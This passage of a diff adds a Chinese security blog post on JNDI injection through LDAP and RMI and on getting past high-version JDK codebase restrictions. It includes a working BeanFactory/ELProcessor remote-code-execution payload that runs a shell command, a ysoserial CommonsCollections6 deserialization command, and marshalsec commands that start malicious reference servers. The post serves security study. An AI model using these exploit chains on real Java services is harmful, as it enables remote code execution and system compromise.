+<h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>除了RMI服务外，JNDI也可以对接LDAP服务，LDAP也能返回JNDI Reference对象。整个过程与上个方法类似，并且不受<code>com.sun.jndi.rmi.object.trustCodebase</code>等限制，适用范围更广。</p>
+<h2 id="限制-2"><a href="#限制-2" class="headerlink" title="限制"></a>限制</h2><p>在Oracle JDK11.0.1、8u191、7u201、6u211之后，将com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被调整为false。</p>
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>前面的流程与RMI一样，最终进入了PartialCompositeContext#lookup。</p>
+<p><img src="11.png" alt=""></p>
+<p>然后进入了ComponentContext#p_lookup。</p>
+<p><img src="12.png" alt=""></p>
+<p>继续跟进LdapCtx#c_lookup。</p>
+<p><img src="13.png" alt=""></p>
+<p>在该函数中，最终进入DirectoryManager#getObjectInstance(),后面的过程与RMI的后面一样，最终实例化。</p>
+<h2 id="限制-3"><a href="#限制-3" class="headerlink" title="限制"></a>限制</h2><p>在JDK8u191之后，在使用codebase从远程loadClass时，会进行判断。</p>
+<p><img src="14.png" alt=""></p>
+<p>且com.sun.jndi.ldap.object.trustURLCodebase被设置为了false。</p>
+<p><img src="15.png" alt=""></p>
+<h1 id="绕过高版本JDK的限制"><a href="#绕过高版本JDK的限制" class="headerlink" title="绕过高版本JDK的限制"></a>绕过高版本JDK的限制</h1><p>根据以上介绍的限制，在Oracle JDK11.0.1、8u191、7u201、6u211及更高版本的JDK来说，前面提到的方式都失效了。对于存在以上漏洞但JDK版本很高的环境中，有人提到了如下2中方式进行bypass。<br>两种方式都很依赖受害者本地CLASSPATH中环境。  </p>
+<h2 id="利用本地CLASSPATH中的恶意Reference-Factory类"><a href="#利用本地CLASSPATH中的恶意Reference-Factory类" class="headerlink" title="利用本地CLASSPATH中的恶意Reference Factory类"></a>利用本地CLASSPATH中的恶意Reference Factory类</h2><p>前面分析的整个过程首先是远程加载factory，然后进行实例化。但是在高版本的限制中，无法进行远程加载的时候，利用本地存在的Reference恶意类。实际上，本地不可能存在一个实例化就执行恶意代码的类。因此，看看加载完factory并实例化之后的事情。定位到NamingManager#getObjectInstance。</p>
+<p><img src="16.png" alt=""></p>
+<p>在前面分析到NamingManager#getObjectFactoryFromReference时，首先会进行本地factory的加载。 </p>
+<p><img src="10.png" alt=""></p>
+<p>在通过getObjectFactoryFromReference中获取到Factory类之后，对调用其getObjectInstance函数，其中参数ref和name是可控的。</p>
+<p>因此，在高版本如JDK8u191以上的版本上，可以在返回的Reference中指定Factory类。这个类必须在受害者目标本地的CLASSPATH中。其中该类需要满足以下条件:</p>
+<ol>
+<li>实现<code>javax.naming.spi.ObjectFactory</code>接口</li>
+<li>至少存在一个getObjectInstance()方法</li>
+</ol>
+<h3 id="BeanFactory"><a href="#BeanFactory" class="headerlink" title="BeanFactory"></a>BeanFactory</h3><p>org.apache.naming.factory.BeanFactory满足以上两个条件。它存在于Tomcat依赖包中，使用非常广泛，来看看如何利用它。首先定位到BeanFactory#getObjectInstance()函数。</p>
+<p><img src="9.png" alt=""></p>
+<p>可以看到在该函数中，如果传入的obj时一个ResourceRef实例，根据Reference对象的类名加载相应的类，并通过反射的方式实例化Reference所指向的任意Bean Class。</p>
+<p><img src="17.png" alt=""></p>
+<p>并且调用满足条件的方法，其中大概率是调用setter方法为所有属性赋值。看看满足条件的方法。</p>
+<p><img src="19.png" alt=""></p>
+<p>首先Reference类获取”forceString”的值，若值中存在等号(61)，则等号右边作为属性值对应的方法，左边为该方法的参数。若不含有=号，则获取该属性值的setter方法。相当于”forceString”可以为特定的属性指定setter方法一样。然后将方法和参数放入forced中，以供后续调用。</p>
+<p>在这样的情况下，目标Bean Class必须: 1)有一个无参构造方法；2)存在能被调用的方法。</p>
+<h3 id="ELProcessor类"><a href="#ELProcessor类" class="headerlink" title="ELProcessor类"></a>ELProcessor类</h3><p>在一篇文章中提到了利用javax.el.ELProcessor类。</p>
+<p><img src="18.png" alt=""></p>
+<p>其中eval函数仅接受一个String参数，执行传入的EL表达式。因此，只需要传入恶意的EL表达式即可达到RCE。现在需要解决的问题是将eval()函数设置为Reference类某属性的setter方法。让其自动调用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ResourceRef ref &#x3D; new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true, &quot;org.apache.naming.factory.BeanFactory&quot;, null);</span><br><span class="line">ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x&#x3D;eval&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>根据前面的分析，x为eval()方法的参数，传入恶意的表达式。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ref.add(new StringRefAddr(&quot;x&quot;, &quot;&quot;&quot;.getClass().forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;JavaScript&quot;).eval(&quot;new java.lang.ProcessBuilder[&#39;(java.lang.String[])&#39;]([&#39;&#x2F;bin&#x2F;sh&#39;,&#39;-c&#39;,&#39;open &#x2F;Applications&#x2F;Calculator.app&#39;]).start()&quot;)&quot;));</span><br></pre></td></tr></table></figure>
+
+<h3 id="完整的payload"><a href="#完整的payload" class="headerlink" title="完整的payload"></a>完整的payload</h3><p>以RMI服务器为例：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            ResourceRef ref = <span class="keyword">new</span> ResourceRef(<span class="string">"javax.el.ELProcessor"</span>, <span class="keyword">null</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="keyword">true</span>, <span class="string">"org.apache.naming.factory.BeanFactory"</span>, <span class="keyword">null</span>);</span><br><span class="line">            ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"forceString"</span>, <span class="string">"x=eval"</span>));</span><br><span class="line">            ref.add(<span class="keyword">new</span> StringRefAddr(<span class="string">"x"</span>, <span class="string">""</span><span class="string">".getClass().forName("</span>javax.script.ScriptEngineManager<span class="string">").newInstance().getEngineByName("</span>JavaScript<span class="string">").eval("</span><span class="keyword">new</span> java.lang.ProcessBuilder[<span class="string">'(java.lang.String[])'</span>]([<span class="string">'/bin/sh'</span>,<span class="string">'-c'</span>,<span class="string">'open /Applications/Calculator.app'</span>]).start()<span class="string">")"</span>));</span><br><span class="line">            ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(ref);</span><br><span class="line">            registry.bind(<span class="string">"calc"</span>, referenceWrapper);</span><br></pre></td></tr></table></figure>
+
+<p>运行之后，客户端运行代码即可弹出计算器。</p>
+<blockquote>
+<p>在运行过程，可能需要多运行几次才能成功。在本地测试时，时而失败，时而成功。可能与EL表达式有关。</p>
+</blockquote>
+<h2 id="利用LDAP返回恶意的序列化对象"><a href="#利用LDAP返回恶意的序列化对象" class="headerlink" title="利用LDAP返回恶意的序列化对象"></a>利用LDAP返回恶意的序列化对象</h2><p>JNDI与LDAP之间交互，其中Java对象在LDAP目录有多种存储形式:  </p>
+<ul>
+<li>Java序列化</li>
+<li>JNDI Reference</li>
+<li>Marshalled对象</li>
+<li>Remote Location(已弃用)</li>
+</ul>
+<p>LDAP可以为存储的Java对象指定多种属性:</p>
+<ul>
+<li>javaCodeBase</li>
+<li>objectClass</li>
+<li>javaFactory</li>
+<li>javaSerializedData</li>
+</ul>
+<p>第二种方法中利用的是LDAP服务器支持直接返回一个Java对象的序列化数据。若Java对象的javaSerializedData属性值不为空，则客户端的obj.decodeObject()会对此字段值的内容进行反序列化。定位到obj.decodeObject()。</p>
+<p><img src="20.png" alt="">  </p>
+<p><img src="21.png" alt=""></p>
+<p>当javaSerializedData属性存在时，首先会获取到一个classloader。然后进入obj.deserializeObject()方法。</p>
+<p><img src="22.png" alt=""></p>
+<p>在这里面最终会进入到readObject()方法。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>假设目标系统中存在着有漏洞的CommonsCollections库，那么首先可以利用ysoserial生成一个利用链，这里选择了commonscollections:3.2.1以及CommonsCollections6。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections6 &#39;&#x2F;Applications&#x2F;Calculator.app&#x2F;Contents&#x2F;MacOS&#x2F;Calculator&#39;|base64</span><br></pre></td></tr></table></figure>
+
+<p><img src="23.png" alt=""></p>
+<p>最终的LDAP服务器与前面比较，在sendResult时，对发送的Entry添加javaSerializedData属性，属性值为序列化的payload。</p>
+<p><img src="24.png" alt=""></p>
+<p>在复现时，为了避免codebase的影响，将其他属性注释掉了。最终在客户端lookup时弹出了计算器。</p>
+<h1 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h1><p>在实际遇到这样的漏洞时，直接利用工具会比较方便。</p>
+<h2 id="marshalsec"><a href="#marshalsec" class="headerlink" title="marshalsec"></a>marshalsec</h2><p>marshalsec可以很方便地启动一个LDAP/RMI Server</p>
+<h3 id="rmi"><a href="#rmi" class="headerlink" title="rmi"></a>rmi</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec.jar marshalsec.jndi.RMIRefServer http:&#x2F;&#x2F;ip:port&#x2F;package&#x2F;#Class 1099</span><br></pre></td></tr></table></figure>
+
+<h3 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http:&#x2F;&#x2F;ip:port&#x2F;package&#x2F;#Class 1389</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://y4er.com/post/attack-java-jndi-rmi-ldap-2/" target="_blank" rel="noopener">攻击Java中的JNDI、RMI、LDAP(二)</a></li>
+<li><a href="https://xz.aliyun.com/t/6633" target="_blank" rel="noopener">JNDI注入整体的调用栈分析</a></li>
+<li><a href="https://www.anquanke.com/post/id/199481#h3-7" target="_blank" rel="noopener">JNDI with RMI</a></li>
+<li><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" target="_blank" rel="noopener">如何绕过高版本JDK的限制进行JNDI注入利用</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>JAVA安全</category>
+      </categories>
+      <tags>
+        <tag>JNDI</tag>
       </tags>
   </entry>
 </search>
